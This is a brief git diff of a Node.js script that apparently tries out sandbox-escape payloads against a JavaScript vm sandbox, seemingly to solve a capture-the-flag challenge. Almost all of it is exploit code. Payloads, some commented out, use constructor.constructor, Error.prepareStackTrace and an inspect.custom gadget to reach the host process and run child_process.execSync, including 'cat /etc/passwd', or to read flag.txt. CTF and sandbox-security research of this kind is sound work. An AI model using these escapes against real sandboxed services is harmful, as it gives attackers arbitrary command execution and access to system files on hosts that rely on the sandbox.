@@ -50,5 +50,10 @@ try {
 // result = new String(vm.run(`sum([2]);vm.runInNewContext(const process = this.constructor.constructor('return this.process')();
 // process.mainModule.require('child_process').execSync('cat /etc/passwd').toString());////([]);`))
 
-result = new String(vm.run(`sum([2]);function a(){new Error().stack;a();}try{a();}catch(a$t) {a$t.constructor.constructor('return process')().mainModule.require('child_process').execSync('echo hello');};////([])`));
-console.log(result); 
+// result = new String(vm.run(`WebAssembly.compileStreaming({[Symbol.for('nodejs.util.inspect.custom')]:(d, o, i) => {i.constructor('return process')().mainModule.require('fs').readFileSync('/flag.txt');},valueOf:undefined,constructor:undefined}).catch(()=>{});`));
+result = new String(vm.run(`Error.prepareStackTrace=(e,f)=>{f.constructor.constructor('return process')().mainModule.require('fs').readFileSync('flag.txt')};(async ()=>{})()`));
+console.log(result)
+
+// const path = "flag"
+// if(!(new String(path).toString()).includes('flag'))
+//   console.log(fs.readFileSync(path,{encoding: "utf-8"})); 
